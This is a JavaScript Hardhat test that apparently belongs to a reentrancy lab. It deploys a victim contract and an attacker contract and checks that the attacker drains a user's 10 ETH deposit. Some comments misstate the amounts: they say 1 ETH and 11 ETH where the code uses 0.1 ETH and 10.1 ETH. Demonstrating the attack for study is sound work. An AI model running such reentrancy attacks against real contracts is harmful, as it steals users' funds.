const { time,loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");

describe("Reentrancy Attack", function () {

	it("Empty the balance of the victim contract", async function () {

		// Deploy the victim contract
		const ReentrancyVictimFactory = await ethers.getContractFactory("ReentrancyVictim");
		const reentrancyVictim = await ReentrancyVictimFactory.deploy();
		await reentrancyVictim.deployed();

		//Deploy the attacker contract
		const ReentrancyAttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
		const reentrancyAttacker = await ReentrancyAttackerFactory.deploy(reentrancyVictim.address);
		await reentrancyAttacker.deployed();

		// Get two addresses, treat one as victim user and one as attacker
		const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

		// Victim User deposits 10 ETH into reentrancyVictim
		let tx = await reentrancyVictim.connect(innocentAddress).addBalance({
			value: parseEther("10"),
		});
		await tx.wait();

		// Check reentrancyVictim's balance is 10 ETH at this point
		let balanceETH = await ethers.provider.getBalance(reentrancyVictim.address);
		expect(balanceETH).to.equal(parseEther("10"));

		// Attacker calls the `attack` function on reentrancyAttacker and sends 1 ETH
		tx = await reentrancyAttacker.connect(attackerAddress).attack({
			value: parseEther("0.1"),
		});
		await tx.wait();

		// Balance of the reentrancyVictim's address is now zero
		balanceETH = await ethers.provider.getBalance(reentrancyVictim.address);
		expect(balanceETH).to.equal(BigNumber.from("0"));

		// Balance of reentrancyAttacker is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
		balanceETH = await ethers.provider.getBalance(reentrancyAttacker.address);
		expect(balanceETH).to.equal(parseEther("10.1"));
	});

});